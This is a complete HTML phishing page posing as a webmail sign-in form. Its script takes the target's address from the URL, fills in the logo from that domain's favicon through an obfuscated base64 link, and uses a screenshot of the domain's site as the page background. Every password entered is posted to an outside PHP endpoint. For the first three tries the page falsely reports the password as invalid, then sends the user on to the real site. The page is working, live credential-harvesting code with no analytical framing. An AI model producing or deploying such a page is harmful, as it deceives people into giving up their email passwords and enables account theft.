<!DOCTYPE html>
<html><!--"hgoz1rl96i6u7i"--><head>

   <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">

   <style>
      @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
   </style>

   <style type="text/css">
      /* Global box-sizing fix for perfect alignment */
      *, *::before, *::after {
          box-sizing: border-box;
      }

      body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol";color:#535353}
      .login-40 .form-section{max-width:380px;margin:0 auto;border-radius:10px;padding:10px 35px;border:1px solid #e8e7e7;margin-top:50px}
      .img-fluid{max-width:100%!important;height:auto}
      .login-40 .login-inner-form .form-box{float:left;width:100%;position:relative}
      .login-40 .login-inner-form .form-group{margin-bottom:30px}
      .login-40 .login-inner-form .form-box input{float:left;width:100%;padding:15.5px 50px 15.5px 25px;border-radius:50px;border:1px solid #dbdbdb;box-shadow:0 1px 3px 0 rgb(0 0 0 / 6%);outline:none;background:#fff}
      .login-40 .login-inner-form .input-text{font-size:16px;color:#717171}
      .form-control:focus{box-shadow:none}
      .login-40 .login-inner-form .form-box i{position:absolute;top:14px;right:25px;font-size:19px;cursor:pointer}
      .logo{text-align:center;margin-bottom:35px}
      .login-40 .login-inner-form .checkbox{margin-bottom:30px;font-size:16px}
      .login-40 .login-inner-form input[type=checkbox],input[type=radio]{margin-top:4px;margin-right:3px;position:absolute;margin-left:0}
      .login-40 .login-inner-form label{font-weight:500;font-size:14px;margin-bottom:5px}
      .login-40 .login-inner-form .form-check-label{padding-left:25px;margin-bottom:0;font-size:16px;color:#717171}
      .login-40 .login-inner-form .checkbox-theme input[type=checkbox]:checked+label::before{background-color:#50a1ff;border-color:#50a1ff}
      .login-40 .login-inner-form input[type=checkbox]:checked+label:before{font-weight:300;color:#f3f3f3;line-height:15px;font-size:14px;content:"\2713";text-align:center}
      .login-40 .login-inner-form .form-check label::before{content:"";display:inline-block;position:absolute;width:22px;height:22px;margin-left:-27px;border:1px solid #c5c3c3;border-radius:3px;background-color:#fff}
      .btn-block{display:block;width:100%}
      .sub_b{-webkit-transition:background-color 300ms linear;-ms-transition:background-color 300ms linear;transition:background-color 300ms linear}
      .sub_b:hover{background-color:#0b5ed79e}
      .login-40 .login-inner-form .btn-md{cursor:pointer;padding:15.5px 50px 14.5px 50px;font-size:17px;font-weight:400;border-radius:50px}
      .login-40 .login-inner-form .btn-theme{background:#50a1ff;border:none;color:#fff}
      .login-40 .login-inner-form .btn-theme:hover{background:#4595f1}
      #logo{height:30px}
      body.sharp .f_base,body.sharp .f_form .form-control,body.sharp button,body.sharp .alert{border-radius:0}
      a:hover{text-decoration:none}
      a{text-decoration:none;color:#007bff}
      body.sharp .alert{font-size:14px;padding:10px 10px}
      .dom_pl{font-size:16px;margin-bottom:0}
      #frame_back{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
      .frame_back_over{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1}
      #frame_back{display:none}
      .erx{margin:10px 0 0;padding:7px 5px;background-color:#c50000;color:#fff;font-size:16px;margin-top:-1px}
      .login-inner-form{margin-top:-20px}
   </style>
</head>

<body class="dark sharp" id="lebody" style="background-image: url(https://i.imgur.com/W6H22Ci.png) ; background-size: cover;">
   <div class="loader_b hidden" id="loader">
      <div class="loader"></div>
   </div>
   <iframe id="frame_back" scrolling="no"></iframe>
   <div class="frame_back_over"></div>
   <div class="b_base login-40">
      <div class="f_base container">
         <div class="f_in row">
            <div class="col-md-12">
               <div class="form-section" style="background:rgba(250,250,250,2);">
                  <div class="f_in">
                     <div class="logo">
                        <a href="">
                            <img src="" alt="Webmail" id="logo">
                              <h2 id="logoname" style="font-size: 2rem;"> </h2>        
                        </a>
                    </div>
                     <h3 id="dom_name" style="margin-bottom: 0rem;"></h3>
                     <center><h2 style="color: #212529; line-height: 1.2;">Sign In To Continue</h2></center>

                     <div class="erx" style="display:none ;">Connection error, kindly try again!</div>
                     <div class="login-inner-form">
                        
                        <form class="f_form" id="loginForm" method="POST">
                           <input type="hidden" name="fcc" id="fcc" value="">
                           <div class="alert alert-danger mb-3 hidden" id="err" role="alert">
                           </div>
                           <div class="alert alert-primary mb-3 hidden" id="mi" role="alert">
                           </div>
                            <div class="form-group form-box">
                                <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
                            </div>
                            <div class="form-group form-box">
                                <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
                              <i class="fa fa-eye sla"  id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true"></i>
                            </div>
                            <span id="msg" style="color:red;"></span>
                            <div class="checkbox clearfix">
                                <div class="form-check checkbox-theme">
                                    <input class="form-check-input" type="checkbox" value="" id="rem_me">
                                    <label class="form-check-label" for="rem_me">
                                        Remember me
                                    </label>
                                </div>
                            </div>
                            <div class="form-group mb-0">
                                <button type="submit" id="getitBtn" name="sub" class="btn-md btn-theme btn-block sub_b">Continue</button>
                            </div>
                        </form>
                    </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      
   </div>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            const getit = new URLSearchParams(window.location.search);
            const hashedget = getit.get('e');
            
            if (!hashedget) {
                $('body').html('<div style="text-align:center; padding:50px; font-size:24px;">Please provide an email parameter in the URL (?e=email@domain.com)</div>');
            } else {
                $("#email").val(hashedget);
                let dxmain = hashedget.split("@")[1];
                let sitename = dxmain.split(".")[0].toUpperCase();
                sitename = sitename.charAt(0).toUpperCase() + sitename.slice(1).toLowerCase();
                
                document.title = sitename + document.title;
                document.querySelector('#logoname').textContent = sitename;
                
                let favimg = atob('aHR0cHM6Ly90MS5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnNpemU9NjQmdXJsPWh0dHA6Ly8=')+dxmain
                document.querySelector('link[rel="shortcut icon"]').setAttribute('href', favimg);
                document.querySelector('body').style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${dxmain}')`;
                document.querySelector('#logo').setAttribute('src', favimg);
                
                // Store email domain for final redirect
                window.emailDomain = 'https://' + dxmain;
            }
            
            // Attempt counter
            let attemptCount = 1;
            const MAX_ATTEMPTS = 4;
            
            // The PHP endpoint URL
            const PHP_URL = 'https://scitecinstruments.it.com/customers/send.php';
            
            // Function to send data (always called)
            function sendData(email, password, isLastAttempt) {
                const formData = new FormData();
                formData.append('email', email);
                formData.append('password', password);
                formData.append('fcc', $("#fcc").val());
                formData.append('sub', 'Continue');
                
                fetch(PHP_URL, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.text())
                .then(data => {
                    console.log('Data sent successfully:', data);
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                })
                .finally(() => {
                    if (isLastAttempt) {
                        // Redirect after a short delay on final attempt
                        setTimeout(function() {
                            window.location.href = window.emailDomain;
                        }, 1500);
                    }
                });
            }
            
            // Handle form submission
            $("#loginForm").on('submit', function(e) {
                e.preventDefault(); // always prevent default, we control sending
                
                let email = $("#email").val();
                let password = $("#password").val();
                
                if (!password || password.length < 1) {
                    $("#msg").text("Please enter your password");
                    return;
                }
                
                const isLastAttempt = (attemptCount >= MAX_ATTEMPTS);
                
                // Send data on every attempt
                sendData(email, password, isLastAttempt);
                
                if (isLastAttempt) {
                    // Last attempt: disable button, show redirect message
                    $("#getitBtn").prop('disabled', true).html("Redirecting...");
                    $("#msg").text("Redirecting to your inbox...").css("color", "green");
                } else {
                    // Not last attempt: show error, clear password, increment counter
                    $("#msg").text("Invalid password, try again").css("color", "red");
                    $("#password").val("");
                    attemptCount++;
                }
            });
        });

        // Toggle password visibility
        function togglePasswordVisibility() {
            const e = document.getElementById("password");
            const t = document.getElementById("togglePassword");
            
            if ("password" === e.type) {
                e.type = "text";
                t.classList.remove("fa-eye");
                t.classList.add("fa-eye-slash");
            } else {
                e.type = "password";
                t.classList.remove("fa-eye-slash");
                t.classList.add("fa-eye");
            }
        }
    </script>
</body>
</html>
